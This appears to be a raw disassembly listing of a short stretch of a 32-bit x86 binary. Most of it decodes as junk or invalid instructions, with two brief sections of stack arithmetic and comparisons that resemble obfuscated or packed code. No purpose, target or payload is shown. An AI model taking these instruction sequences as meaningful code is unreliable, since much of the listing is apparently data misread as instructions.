  41b9d4:	jb     0x41ba28
  41b9d6:	aam    0x7f
  41b9d8:	sbb    bh,BYTE PTR [edx-0x1f]
  41b9db:	cmp    BYTE PTR gs:0x9d748dae,ch
  41b9e2:	cmp    BYTE PTR [ebx],bh
  41b9e4:	sub    edi,edx
  41b9e6:	push   esp
  41b9e7:	mov    fs,WORD PTR [edi-0x7a]
  41b9ea:	loop   0x41ba22
  41b9ec:	scas   eax,DWORD PTR es:[edi]
  41b9ed:	push   eax
  41b9ee:	mov    al,0xb7
  41b9f0:	and    BYTE PTR [edx-0x35f971f8],ah
  41b9f6:	fldpi  
  41b9f8:	clc    
  41b9f9:	(bad)  
  41b9fb:	std    
  41b9fc:	addr16 pop ss
  41b9fe:	xor    DWORD PTR [esi+ebx*2-0x21],eax
  41ba02:	add    cl,BYTE PTR [eax-0xe]
  41ba05:	icebp  
  41ba06:	test   al,0x86
  41ba08:	mov    edi,0x20758b11
  41ba0d:	xlat   BYTE PTR ds:[ebx]
  41ba0e:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  41ba10:	inc    BYTE PTR [ebp+0x54]
  41ba13:	call   0x156a:0xf031b62b
  41ba1a:	scas   eax,DWORD PTR es:[edi]
  41ba1b:	or     DWORD PTR [eax+ecx*4],edx
  41ba1e:	cmp    dl,BYTE PTR [bp+si-0x43]
  41ba22:	add    al,al
  41ba24:	not    cl
  41ba26:	and    dh,al
  41ba28:	pop    ds
  41ba29:	jle    0x41ba2f
  41ba2b:	or     ecx,DWORD PTR [edi]
  41ba2d:	push   esp
  41ba2e:	adc    al,0x5a
  41ba30:	fs pusha 
  41ba32:	push   ebp
  41ba33:	mov    ebx,0xc15ed603
  41ba38:	jecxz  0x41b9d9
  41ba3a:	adc    al,0xd4
  41ba3c:	fistp  WORD PTR [ebx+0x615a0fe]
  41ba42:	sub    BYTE PTR [edi-0x4d36d2be],bh
  41ba48:	shr    edx,0x8b
  41ba4b:	inc    edx
  41ba4c:	pop    esp
  41ba4d:	adc    dh,BYTE PTR [ebx-0x4c00767]
  41ba53:	pusha  
  41ba54:	cmp    DWORD PTR [edi],esi
  41ba56:	bound  eax,QWORD PTR [eax]
  41ba58:	jge    0x41ba82
  41ba5a:	mov    dl,0x8f
  41ba5c:	shl    DWORD PTR [edi],0x13
  41ba5f:	cmp    DWORD PTR [esi+0x64],ecx
  41ba62:	and    al,0x8d
  41ba64:	pusha  
  41ba65:	call   0x3c6d3673
  41ba6a:	mov    ecx,0xe54aea84
  41ba6f:	adc    eax,0x77ed97e4
  41ba74:	mov    al,0x4b
  41ba76:	loope  0x41bab1
  41ba78:	add    dl,bh
  41ba7a:	add    eax,0xf2a58bd2
  41ba7f:	mov    eax,ds:0x871bb738
  41ba84:	inc    edx
  41ba85:	test   DWORD PTR [edx],ebx
  41ba87:	sub    ch,al
  41ba89:	pop    ebx
  41ba8a:	xchg   edx,eax
  41ba8b:	(bad)  
  41ba8c:	rcl    cl,0x93
  41ba8f:	push   edi
  41ba90:	nop
  41ba91:	ds pop es
  41ba93:	xor    dh,cl
  41ba95:	ret    0x50e
  41ba98:	mov    DWORD PTR [ebp+0xc],ebx
  41ba9b:	test   DWORD PTR [ebx],0x63e462d7
  41baa1:	add    edi,DWORD PTR [edx+eiz*1]
  41baa4:	cs ret 0x7095
  41baa8:	clc    
  41baa9:	and    eax,0x9f07b8f3
  41baae:	push   eax
  41baaf:	nop
  41bab0:	jmp    0x324a1568
  41bab5:	(bad)  
  41bab7:	mov    esp,0xdba054e2
  41babc:	mov    DWORD PTR [edi-0x3d],ecx
  41babf:	test   edx,0x4a012c3c
  41bac5:	adc    dh,dl
  41bac7:	xor    DWORD PTR [esi],ecx
  41bac9:	xchg   ebp,eax
  41baca:	pop    ebp
  41bacb:	stos   BYTE PTR es:[edi],al
  41bacc:	or     eax,0xa81b046
  41bad1:	pop    ss
  41bad2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bad3:	adc    ebp,DWORD PTR [edx]
  41bad5:	xchg   BYTE PTR [ebx+0x6d5e0700],ah
  41badb:	mov    ds:0xd38b9ca5,al
  41bae0:	mov    dh,BYTE PTR [esi+0x3f]
  41bae3:	out    dx,eax
  41bae4:	xlat   BYTE PTR ds:[ebx]
  41bae5:	xchg   ebp,eax
  41bae6:	xchg   ebx,eax
  41bae7:	or     eax,0xbbc41cc5
  41baec:	test   BYTE PTR [edi+0x6c],ah
  41baef:	test   DWORD PTR [eax-0x46980f86],eax
  41baf5:	(bad)  
  41baf6:	xchg   esi,eax
  41baf7:	lods   eax,DWORD PTR ds:[esi]
  41baf8:	mov    eax,esp
  41bafa:	leave  
  41bafb:	fdivrp st(1),st
  41bafd:	in     eax,0x64
  41baff:	sti    
  41bb00:	int3   
  41bb01:	(bad)  
  41bb02:	xor    ecx,DWORD PTR [ebp-0x1056c076]
  41bb08:	fcom   DWORD PTR [ebp-0x50fc7376]
  41bb0e:	je     0x41bacd
  41bb10:	or     edi,edx
  41bb12:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bb13:	cmp    dh,cl
  41bb15:	mul    DWORD PTR ds:0xefdca6da
  41bb1b:	pop    edx
  41bb1c:	pop    eax
  41bb1d:	adc    bl,dl
  41bb1f:	or     DWORD PTR [edi-0x66],ecx
  41bb22:	mov    eax,0x8fc3036b
  41bb27:	rcl    DWORD PTR [esi-0x41],cl
  41bb2a:	int    0x18
  41bb2c:	mov    cl,0xa2
  41bb2e:	push   ebp
  41bb2f:	push   ss
  41bb30:	ins    DWORD PTR es:[edi],dx
  41bb31:	dec    ebx
  41bb32:	pop    esi
  41bb33:	shl    DWORD PTR [ebx-0x13eae8],1
  41bb39:	xchg   esi,eax
  41bb3a:	adc    esp,eax
  41bb3c:	pop    edi
  41bb3d:	popfw  
  41bb3f:	das    
  41bb40:	out    0xd5,al
  41bb42:	stos   BYTE PTR es:[edi],al
  41bb43:	cwde   
  41bb44:	lds    ebp,FWORD PTR [ebp-0xe]
  41bb47:	xchg   bl,bh
  41bb49:	fcmovne st,st(0)
  41bb4b:	retf   
  41bb4c:	mov    ebx,0x8b15623e
  41bb51:	mov    edx,0xe5180af1
  41bb56:	cmp    ah,BYTE PTR [ebx+esi*4+0x748893f9]
  41bb5d:	frstor [edi]
  41bb5f:	rdtsc  
  41bb61:	in     eax,0x6e
  41bb63:	fld    TBYTE PTR [edx+0x45c063b5]
  41bb69:	push   es
  41bb6a:	jle    0x41bb5c
  41bb6c:	sub    ecx,DWORD PTR [esi-0x69d65c9d]
  41bb72:	(bad)  
  41bb73:	in     eax,0x4e
  41bb75:	cmp    esp,edi
  41bb77:	stos   BYTE PTR es:[edi],al
  41bb78:	mov    ds:0xcc664614,eax
  41bb7d:	xchg   edi,eax
  41bb7e:	jne    0x41bbf0
  41bb80:	and    eax,0xb5557662
  41bb85:	pop    esi
  41bb86:	and    ebp,DWORD PTR [edx]
  41bb88:	xchg   BYTE PTR [eax+ebx*4+0x21],bl
  41bb8c:	(bad)
  41bb90:	xor    bh,dl
  41bb92:	outs   dx,BYTE PTR ds:[esi]
  41bb93:	or     bh,BYTE PTR [eax+0x6a]
  41bb96:	xor    ah,ah
  41bb98:	and    eax,DWORD PTR [eax-0x5d753167]
  41bb9e:	ins    DWORD PTR es:[edi],dx
  41bb9f:	push   esi
  41bba0:	arpl   cx,ax
  41bba2:	mov    ds:0xad941fca,al
  41bba7:	mov    cl,0xcf
  41bba9:	xchg   ebp,eax
  41bbaa:	ins    BYTE PTR es:[edi],dx
  41bbab:	shl    BYTE PTR [eax],0xfb
  41bbae:	mov    ch,0xd4
  41bbb0:	shl    DWORD PTR [esi-0x39],1
  41bbb3:	scas   eax,DWORD PTR es:[edi]
  41bbb4:	cdq    
  41bbb5:	test   al,0xdd
  41bbb7:	xchg   edi,eax
  41bbb8:	pop    edi
  41bbb9:	pusha  
  41bbba:	loope  0x41bbba
  41bbbc:	xchg   edi,eax
  41bbbd:	xor    BYTE PTR ds:0xf3c94059,bh
  41bbc3:	xchg   edi,eax
  41bbc4:	or     DWORD PTR [ecx],0x6b88a35e
  41bbca:	or     bl,BYTE PTR [ebp-0x64]
  41bbcd:	jle    0x41bbf3
  41bbcf:	add    DWORD PTR [edi+ebp*8],edi
  41bbd2:	and    cx,dx
  41bbd5:	mov    dx,WORD PTR [esp+0x24]
  41bbda:	or     cx,dx
  41bbdd:	mov    dx,WORD PTR [esp+0x2c]
  41bbe2:	add    cx,dx
  41bbe5:	or     ecx,0x3b22
  41bbeb:	mov    WORD PTR [esp+0x3c],cx
  41bbf0:	jmp    0x41bfbf
  41bbf5:	inc    edx
  41bbf6:	pop    edx
  41bbf7:	push   ecx
  41bbf8:	fwait
  41bbf9:	xor    DWORD PTR [edx+0x237b5a22],ebx
  41bbff:	pop    ecx
  41bc00:	stos   BYTE PTR es:[edi],al
  41bc01:	xchg   edi,eax
  41bc02:	lahf   
  41bc03:	push   ss
  41bc04:	stos   BYTE PTR es:[edi],al
  41bc05:	add    eax,DWORD PTR [ecx+0x12bc1816]
  41bc0b:	sbb    BYTE PTR [eax],bl
  41bc0d:	enter  0x1443,0x29
  41bc11:	inc    eax
  41bc12:	add    BYTE PTR [edi-0x6d],dh
  41bc15:	(bad)
  41bc18:	inc    esi
  41bc19:	xchg   ebp,eax
  41bc1a:	sub    BYTE PTR [ebx+0x464ce382],dh
  41bc20:	lods   al,BYTE PTR ds:[esi]
  41bc21:	sahf   
  41bc22:	les    eax,FWORD PTR [ebp+0x39]
  41bc25:	test   bl,bh
  41bc27:	xchg   edi,eax
  41bc28:	out    0x68,al
  41bc2a:	and    al,0xd3
  41bc2c:	mov    edx,0x8771fa36
  41bc31:	push   edx
  41bc32:	scas   al,BYTE PTR es:[edi]
  41bc33:	mov    eax,ds:0xa2b7e6dd
  41bc38:	stc    
  41bc39:	pusha  
  41bc3a:	xor    eax,0xfe815f24
  41bc3f:	sub    eax,0x61edce16
  41bc44:	mov    eax,ds:0x9ba43ef2
  41bc49:	xor    al,0xeb
  41bc4b:	leave  
  41bc4c:	test   al,0x27
  41bc4e:	popf   
  41bc4f:	call   DWORD PTR [ecx]
  41bc51:	dec    esp
  41bc52:	push   cs
  41bc53:	xor    esp,DWORD PTR [ebp-0x65c3967b]
  41bc59:	xchg   ebp,eax
  41bc5a:	sbb    ecx,ecx
  41bc5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bc5d:	jmp    0xefad:0x8478490e
  41bc64:	ficom  WORD PTR [edi]
  41bc66:	xchg   edi,eax
  41bc67:	push   edx
  41bc68:	push   ebp
  41bc69:	add    edi,DWORD PTR [edx]
  41bc6b:	loop   0x41bcad
  41bc6d:	push   esp
  41bc6e:	nop
  41bc6f:	es xchg ebp,eax
  41bc71:	pop    ebp
  41bc72:	aaa    
  41bc73:	lods   al,BYTE PTR ds:[esi]
  41bc74:	sub    al,0xfe
  41bc76:	adc    ecx,DWORD PTR [esi+esi*1-0x10bc0240]
  41bc7d:	inc    edx
  41bc7e:	(bad)  
  41bc7f:	and    al,0xd6
  41bc81:	xchg   BYTE PTR [eax+0x7e],dl
  41bc84:	mov    DWORD PTR [edi+ebp*2+0x4b],esi
  41bc88:	(bad)  
  41bc89:	cmp    al,0xbb
  41bc8b:	cli    
  41bc8c:	or     eax,0xee7a1753
  41bc91:	xchg   esp,eax
  41bc92:	aad    0x78
  41bc94:	lea    esi,[ebx-0x24b602f]
  41bc9a:	xor    BYTE PTR [esi],dl
  41bc9c:	jmp    0xcbb6cd62
  41bca1:	jbe    0x41bcd5
  41bca3:	pop    esp
  41bca4:	mov    bh,0xb9
  41bca6:	mov    BYTE PTR [esi],ah
  41bca8:	and    BYTE PTR [ebx],0xa0
  41bcab:	inc    esp
  41bcac:	and    al,0x81
  41bcae:	mov    ebp,0xf42f6532
  41bcb3:	inc    eax
  41bcb4:	mov    ds:0x651cb747,eax
  41bcb9:	dec    esp
  41bcba:	xchg   ecx,edi
  41bcbc:	jmp    0x41bc72
  41bcbe:	xchg   edi,eax
  41bcbf:	cdq    
  41bcc0:	cs scas eax,DWORD PTR es:[edi]
  41bcc2:	retf   
  41bcc3:	into   
  41bcc4:	lahf   
  41bcc5:	mov    bh,0xb7
  41bcc7:	sti    
  41bcc8:	(bad)  
  41bcca:	dec    esi
  41bccb:	xchg   BYTE PTR [ecx-0xba0ab81],cl
  41bcd1:	cwde   
  41bcd2:	dec    edi
  41bcd3:	push   ebp
  41bcd4:	sbb    eax,DWORD PTR [ebp-0x17]
  41bcd7:	xor    dl,BYTE PTR [edi+edx*1-0x76389b11]
  41bcde:	push   0xfffffff9
  41bce0:	mov    ebp,DWORD PTR [ebx+0x7c]
  41bce3:	jmp    0x6e005260
  41bce8:	ss and al,0x98
  41bceb:	mov    edx,0xfa43b3e8
  41bcf0:	jg     0x41bd34
  41bcf2:	mov    ecx,0x21b506cd
  41bcf7:	mov    WORD PTR [edx+0x51],ds
  41bcfa:	cmp    ch,BYTE PTR [eax+0x71]
  41bcfd:	xor    al,0x1
  41bcff:	sub    DWORD PTR [edx],ebp
  41bd01:	or     eax,0xb0ffa5f4
  41bd06:	aaa    
  41bd07:	dec    edx
  41bd08:	lock nop
  41bd0a:	mov    DWORD PTR [edx-0x55],edx
  41bd0d:	sub    edi,DWORD PTR [eax+eax*8+0x1a]
  41bd11:	enter  0x9ca0,0x4c
  41bd15:	mov    bh,0x71
  41bd17:	mov    edi,DWORD PTR [esp+ebx*2-0x6dd29982]
  41bd1e:	shl    BYTE PTR [ebp+0x5a19bec4],1
  41bd24:	add    BYTE PTR [ebx+0x6d],bh
  41bd27:	imul   esi,DWORD PTR [eax-0x72],0xffffff94
  41bd2b:	lods   al,BYTE PTR ds:[esi]
  41bd2c:	daa    
  41bd2d:	mov    ecx,DWORD PTR [ecx-0x6e]
  41bd30:	cmp    al,0x86
  41bd32:	mov    al,0xfc
  41bd34:	aas    
  41bd35:	inc    esp
  41bd36:	mov    al,ds:0x2e24fc4
  41bd3b:	mov    edx,0x413f5aea
  41bd40:	popa   
  41bd41:	adc    eax,0x87132e88
  41bd46:	mov    ecx,ebp
  41bd48:	jmp    0xeceb:0x8a9374e7
  41bd4f:	xlat   BYTE PTR ds:[ebx]
  41bd50:	push   0xa643e7c2
  41bd55:	xor    al,0x69
  41bd57:	pop    eax
  41bd58:	(bad)  
  41bd59:	ds dec ecx
  41bd5b:	cmp    DWORD PTR [ebp-0x6a],edx
  41bd5e:	fld    DWORD PTR [eax+0x1c]
  41bd61:	adc    esp,0x694d3b2d
  41bd67:	sbb    ebx,eax
  41bd69:	xchg   esp,eax
  41bd6a:	dec    ecx
  41bd6b:	daa    
  41bd6c:	int3   
  41bd6d:	(bad)  
  41bd6e:	jbe    0x41bd0c
  41bd70:	loop   0x41bd97
  41bd72:	pop    ss
  41bd73:	arpl   WORD PTR [edi-0x30],ax
  41bd76:	arpl   dx,bx
  41bd78:	loope  0x41bd3e
  41bd7a:	ficom  DWORD PTR [eax+0x68]
  41bd7d:	inc    ecx
  41bd7e:	daa    
  41bd7f:	jp     0x41bdd7
  41bd81:	lock dec esp
  41bd83:	xlat   BYTE PTR ds:[ebx]
  41bd84:	repz or ah,BYTE PTR [edi]
  41bd87:	push   ebp
  41bd88:	xchg   ebp,eax
  41bd89:	in     al,dx
  41bd8a:	push   esp
  41bd8b:	sub    DWORD PTR [ebp-0x6609123],ebp
  41bd91:	jl     0x41bdc3
  41bd93:	aas    
  41bd94:	and    eax,DWORD PTR [eax+0x23]
  41bd97:	out    dx,al
  41bd98:	xchg   ecx,eax
  41bd99:	test   BYTE PTR [edx-0x1c9dea92],dl
  41bd9f:	imul   edi,edi,0x6f
  41bda2:	cmp    DWORD PTR [ebp+0x78],eax
  41bda5:	fnsave [ebx+0x34]
  41bda8:	int3   
  41bda9:	ficomp WORD PTR [edx]
  41bdab:	jo     0x41bda2
  41bdad:	pop    esp
  41bdae:	xchg   BYTE PTR [ecx-0x6f],dh
  41bdb1:	(bad)  
  41bdb2:	adc    al,0xb7
  41bdb4:	stc    
  41bdb5:	xor    BYTE PTR [eax+0x4a],cl
  41bdb8:	or     eax,0xaa9b25dd
  41bdbd:	sub    al,0x9e
  41bdbf:	loopne 0x41be0f
  41bdc1:	xchg   ecx,eax
  41bdc2:	dec    edi
  41bdc3:	fldenv [esi-0x4535ab3e]
  41bdc9:	jmp    0x4d00:0x4f612fa7
  41bdd0:	or     DWORD PTR [esi+ebp*2+0x4cd7c362],0x4e
  41bdd8:	push   es
  41bdd9:	sbb    edx,DWORD PTR [ebx*8-0x7b06e284]
  41bde0:	inc    esp
  41bde1:	sub    dh,BYTE PTR [ebp-0x21299f5a]
  41bde7:	push   ebp
  41bde8:	pop    es
  41bde9:	fstp   QWORD PTR [ebx-0x10]
  41bdec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bded:	push   edi
  41bdee:	lods   al,BYTE PTR ds:[esi]
  41bdef:	adc    al,0x88
  41bdf1:	push   esp
  41bdf2:	cmp    eax,0x4aee9ee2
  41bdf7:	ret    0x4bc6
  41bdfa:	bound  ebx,QWORD PTR [ecx]
  41bdfc:	mov    eax,ds:0xa8b87092
  41be01:	rcl    BYTE PTR [esp+ebp*4],1
  41be04:	in     al,dx
  41be05:	mov    al,ds:0xea29cd42
  41be0a:	ficom  WORD PTR [ebp-0x35]
  41be0d:	ja     0x41bdbe
  41be0f:	add    al,dh
  41be11:	sahf   
  41be12:	imul   edi,DWORD PTR [esi],0x46a751c6
  41be18:	retf   0xba9d
  41be1b:	dec    esi
  41be1c:	jecxz  0x41be2f
  41be1e:	jno    0x41bda3
  41be20:	jo     0x41bdb3
  41be22:	jae    0x41be31
  41be24:	dec    DWORD PTR ds:0x38f4b67a
  41be2a:	sub    BYTE PTR [ebx+0x3a],ch
  41be2d:	push   ebx
  41be2e:	out    0x66,eax
  41be30:	adc    BYTE PTR [ecx],al
  41be32:	fsub   DWORD PTR [edi+ecx*4]
  41be35:	cmp    al,bh
  41be37:	repnz das 
  41be39:	sbb    cl,dl
  41be3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41be3c:	test   eax,0x241cc7ab
  41be41:	shl    DWORD PTR [ebp-0x20],0x9d
  41be45:	push   edi
  41be46:	jo     0x41bdfc
  41be48:	dec    esp
  41be49:	jmp    0x3813:0xf8814783
  41be50:	sbb    bl,BYTE PTR [edi+ecx*4]
  41be53:	(bad)  
  41be54:	ret    0x7a83
  41be57:	std    
  41be58:	sub    ch,bh
  41be5a:	faddp  st(4),st
  41be5c:	inc    edi
  41be5d:	(bad)  
  41be5e:	int    0xd7
  41be60:	pop    ebx
  41be61:	or     DWORD PTR [esi-0x6727d36c],0x2
  41be68:	push   ss
  41be69:	push   eax
  41be6a:	dec    esp
  41be6b:	jb     0x41be2b
  41be6d:	ds fs xor eax,0xa13de097
  41be74:	or     eax,0xb3a894e0
  41be79:	clc    
  41be7a:	je     0x41bef1
  41be7c:	imul   dl
  41be7e:	push   eax
  41be7f:	addr16 jl 0x41be51
  41be82:	add    al,0x7f
  41be84:	adc    ebp,ebx
  41be86:	jno    0x41bee2
  41be88:	cmp    ah,ah
  41be8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41be8b:	das    
  41be8c:	add    eax,0x8f5719c6
  41be91:	out    dx,al
  41be92:	sbb    DWORD PTR [esi+ebx*2+0x41f6af33],eax
  41be99:	xchg   BYTE PTR [ebx-0x57610d85],dl
  41be9f:	xor    dl,BYTE PTR [ecx+edx*2-0x11]
  41bea3:	or     DWORD PTR [ebx+0x2a],0xfb4b692d
  41beaa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41beab:	pop    ecx
  41beac:	loope  0x41be76
  41beae:	xchg   ebx,eax
  41beaf:	lock sbb DWORD PTR [eax+0x6bacfbc],esp
  41beb6:	push   ss
  41beb7:	xchg   ebp,eax
  41beb8:	loope  0x41be99
  41beba:	jno    0x41becc
  41bebc:	sar    eax,cl
  41bebe:	ss cli 
  41bec0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bec1:	or     al,0xa7
  41bec3:	cmp    eax,0x26bb45e9
  41bec8:	or     esi,esi
  41beca:	push   edx
  41becb:	pop    eax
  41becc:	cld    
  41becd:	mov    DWORD PTR [ebx],esp
  41becf:	and    esi,0xedd5d334
  41bed5:	pop    es
  41bed6:	ins    DWORD PTR es:[edi],dx
  41bed7:	enter  0xbbde,0x9e
  41bedb:	or     edx,DWORD PTR [eax-0x68]
  41bede:	and    ax,bp
  41bee1:	loope  0x41be7d
  41bee3:	inc    edx
  41bee4:	xchg   ecx,eax
  41bee5:	out    dx,al
  41bee6:	or     al,al
  41bee8:	pop    esp
  41bee9:	cmp    ah,al
  41beeb:	stos   BYTE PTR es:[edi],al
  41beec:	mov    dh,0xc0
  41beee:	cli    
  41beef:	sub    eax,0x7ced1de8
  41bef4:	mov    ds:0xd6e0618,al
  41bef9:	inc    edi
  41befa:	into   
  41befb:	xchg   esi,eax
  41befc:	(bad)  
  41befd:	shl    BYTE PTR [edi-0x7c3a55cd],1
  41bf03:	test   al,0x5c
  41bf05:	push   ds
  41bf06:	ret    0xcd4
  41bf09:	mov    BYTE PTR [ebp+ebp*1+0x2ea499d9],dh
  41bf10:	jo     0x41bedb
  41bf12:	or     al,0x66
  41bf14:	push   esi
  41bf15:	inc    eax
  41bf16:	pop    ecx
  41bf17:	lods   eax,DWORD PTR ds:[esi]
  41bf18:	mov    BYTE PTR [esp+ebp*4],ch
  41bf1b:	mov    ebx,0x25fc7bb4
  41bf20:	inc    edi
  41bf21:	cld    
  41bf22:	sub    esi,ecx
  41bf24:	mov    dh,0xae
  41bf26:	call   0xd068:0x9b06a409
  41bf2d:	call   0x7fe7:0x4a914079
  41bf34:	add    esi,0x76dce9ff
  41bf3a:	cmp    edi,edi
  41bf3c:	(bad)
  41bf3f:	mov    ebp,0x4175c7f7
  41bf44:	mov    al,ds:0x23caf418
  41bf49:	mov    eax,ds:0x99180a8b
  41bf4e:	scas   al,BYTE PTR es:[edi]
  41bf4f:	fild   QWORD PTR [edi]
  41bf51:	ficom  DWORD PTR [ecx+0x336b99b6]
  41bf57:	xor    dh,BYTE PTR [edi+0x21]
  41bf5a:	ret    
  41bf5b:	and    eax,0xb8df6913
  41bf60:	jne    0x41beff
  41bf62:	idiv   BYTE PTR [esi+0x73e064e4]
  41bf68:	lds    ebp,FWORD PTR [esi]
  41bf6a:	fisttp QWORD PTR [ebx+eax*8-0x2d4b2733]
  41bf71:	retf   0xc7f9
  41bf74:	fwait
  41bf75:	sbb    DWORD PTR [edi],ebp
  41bf77:	pop    ds
  41bf78:	in     eax,0x89
  41bf7a:	inc    eax
  41bf7b:	loopne 0x41bf0e
  41bf7d:	cmp    ch,BYTE PTR [edi]
  41bf7f:	sbb    BYTE PTR [edx],cl
  41bf81:	jmp    0x52cd68c
  41bf86:	cwde   
  41bf87:	pushf  
  41bf88:	shl    BYTE PTR [edi-0x4b],cl
  41bf8b:	jmp    0xf649:0x755a72ef
  41bf92:	jnp    0x41bf97
  41bf94:	enter  0x344b,0x8f
  41bf98:	or     BYTE PTR [ecx-0x49],bh
  41bf9b:	ret    
  41bf9c:	mov    esp,0x7dc5fbbd
  41bfa1:	jmp    0x41bf78
  41bfa3:	rcr    eax,cl
  41bfa5:	pop    edi
  41bfa6:	popa   
  41bfa7:	lock in al,dx
  41bfa9:	daa    
  41bfaa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bfab:	push   ebp
  41bfac:	lods   eax,DWORD PTR ds:[esi]
  41bfad:	(bad)  
  41bfae:	call   0xbbf7:0xca712af3
  41bfb5:	xchg   esp,eax
  41bfb6:	test   al,0x65
  41bfb8:	out    0x3e,eax
  41bfba:	das    
  41bfbb:	lea    esp,[esi]
  41bfbd:	dec    DWORD PTR [esi-0x47]
  41bfc0:	aam    0x57
  41bfc2:	add    BYTE PTR [eax],al
  41bfc4:	mov    WORD PTR [esp+0x2c],cx
  41bfc9:	mov    ecx,0x3b21
  41bfce:	mov    WORD PTR [esp+0x38],cx
  41bfd3:	mov    ecx,0x52fd
  41bfd8:	mov    WORD PTR [esp+0x24],cx
  41bfdd:	mov    ecx,0x2ce0
  41bfe2:	mov    WORD PTR [esp+0xc],cx
  41bfe7:	mov    cx,WORD PTR [esp+0xc]
  41bfec:	mov    dx,WORD PTR [esp+0x24]
  41bff1:	or     cx,dx
  41bff4:	mov    edx,0x21a4
  41bff9:	or     cx,dx
  41bffc:	mov    dx,WORD PTR [esp+0x2c]
  41c001:	sub    cx,dx
  41c004:	mov    dx,WORD PTR [esp+0x38]
  41c009:	sub    cx,dx
  41c00c:	mov    dx,WORD PTR [esp+0x3c]
  41c011:	cmp    dx,cx
  41c014:	jbe    0x41c888
  41c01a:	mov    ecx,0x5008
  41c01f:	mov    WORD PTR [esp+0x24],cx
  41c024:	mov    ecx,0x60ce
  41c029:	mov    WORD PTR [esp+0xc],cx
  41c02e:	movzx  ecx,WORD PTR [esp+0xc]
  41c033:	mov    edx,0x2095
  41c038:	or     cx,dx
  41c03b:	mov    dx,WORD PTR [esp+0x24]
  41c040:	sub    cx,dx
  41c043:	mov    edx,0x10de
  41c048:	or     ecx,0x742f
  41c04e:	imul   ecx,ecx,0x30b2
  41c054:	mov    WORD PTR [esp+0x3c],cx
  41c059:	mov    ecx,0x6143
  41c05e:	mov    WORD PTR [esp+0x38],cx
  41c063:	mov    ecx,0x679f
  41c068:	mov    WORD PTR [esp+0x2c],cx
  41c06d:	mov    ecx,0x1210
  41c072:	mov    WORD PTR [esp+0x24],cx
  41c077:	mov    ecx,0x3308
  41c07c:	mov    WORD PTR [esp+0xc],cx
  41c081:	mov    cx,WORD PTR [esp+0xc]
  41c086:	sub    cx,dx
  41c089:	mov    dx,WORD PTR [esp+0x24]
  41c08e:	xor    cx,dx
  41c091:	mov    dx,WORD PTR [esp+0x2c]
  41c096:	imul   cx,dx
  41c09a:	mov    dx,WORD PTR [esp+0x38]
  41c09f:	and    cx,dx
  41c0a2:	mov    edx,0x694c
  41c0a7:	and    cx,dx
  41c0aa:	mov    dx,WORD PTR [esp+0x3c]
  41c0af:	cmp    dx,cx
  41c0b2:	ja     0x41c888
  41c0b8:	mov    ecx,DWORD PTR [esp+0x18]
  41c0bc:	mov    edx,DWORD PTR [esp+0x1c]
  41c0c0:	shrd   ecx,edx,0x2
  41c0c4:	xor    ecx,eax
  41c0c6:	mov    eax,DWORD PTR [esp+0x18]
  41c0ca:	shr    edx,0x2
  41c0cd:	mov    edx,DWORD PTR [esp+0x1c]
  41c0d1:	xor    edx,edx
  41c0d3:	or     edx,ecx
  41c0d5:	push   edx
  41c0d6:	push   esi
  41c0d7:	shl    eax,0x1e
  41c0da:	push   edi
  41c0db:	lea    eax,[esp+0x7c]
  41c0df:	push   eax
  41c0e0:	lea    eax,[esp+0x28]
  41c0e4:	push   eax
  41c0e5:	jmp    0x41c4b4
  41c0ea:	in     eax,0x66
  41c0ec:	sar    BYTE PTR [ebx],1
  41c0ee:	dec    edx
  41c0ef:	sbb    esp,DWORD PTR [edx+0x1e]
  41c0f2:	icebp  
  41c0f3:	scas   eax,DWORD PTR es:[edi]
  41c0f4:	mov    ch,0x7c
  41c0f6:	test   eax,0xa7be3bdf
  41c0fb:	jns    0x41c113
  41c0fd:	sbb    BYTE PTR [edx+edx*1+0x44811818],bh
  41c104:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c105:	test   bl,0x45
  41c108:	ret    
  41c109:	mov    ah,0xe8
  41c10b:	imul   ecx,DWORD PTR [esp+eiz*2],0xb409e9a3
  41c112:	ja     0x41c135
  41c114:	mov    dh,0x57
  41c116:	outs   dx,DWORD PTR ds:[esi]
  41c117:	adc    BYTE PTR es:[ecx+0x4cf3e51c],cl
  41c11e:	push   cs
  41c11f:	xor    cl,al
  41c121:	sub    DWORD PTR [ebx],ebp
  41c123:	push   esp
  41c124:	jmp    0x41c11d
  41c126:	cli    
  41c127:	mov    ds:0x176b496e,al
  41c12c:	rcl    DWORD PTR [ebp-0x6],cl
  41c12f:	mov    al,0x45
  41c131:	int3   
  41c132:	repz mov eax,ds:0xe40f1f97
  41c138:	or     BYTE PTR [eax-0x106cba72],al
  41c13e:	test   ecx,ecx
  41c140:	and    bh,BYTE PTR [esi-0xd]
  41c143:	fsubr  DWORD PTR [esi-0x424af9b9]
  41c149:	mov    ch,dl
  41c14b:	loopne 0x41c0f6
  41c14d:	aam    0x84
  41c14f:	je     0x41c180
  41c151:	leave  
  41c152:	or     esi,esi
  41c154:	ret    
  41c155:	and    BYTE PTR [edi+0x1e],dh
  41c158:	and    BYTE PTR [ecx],0xdc
  41c15b:	dec    esi
  41c15c:	fs or  al,0x4f
  41c15f:	das    
  41c160:	and    ebp,edi
  41c162:	cld    
  41c163:	retf   0xe656
  41c166:	push   0xffffffd3
  41c168:	jg     0x41c14d
  41c16a:	loope  0x41c1c1
  41c16c:	xchg   ebp,eax
  41c16d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c16e:	fsubr  QWORD PTR [ecx+0x431a5fca]
  41c174:	xchg   BYTE PTR [ecx+0x4571b1ac],dh
  41c17a:	retf   0xb44b
  41c17d:	jl     0x41c13e
  41c17f:	icebp  
  41c180:	sar    BYTE PTR [ecx-0x58],0x68
  41c184:	out    0x9a,eax
  41c186:	ret    
  41c187:	jbe    0x41c14e
  41c189:	mov    esp,ecx
  41c18b:	(bad)  
  41c18d:	inc    ebp
  41c18e:	xchg   ebx,eax
  41c18f:	xchg   ecx,eax
  41c190:	dec    esp
  41c191:	pop    edx
  41c192:	inc    ecx
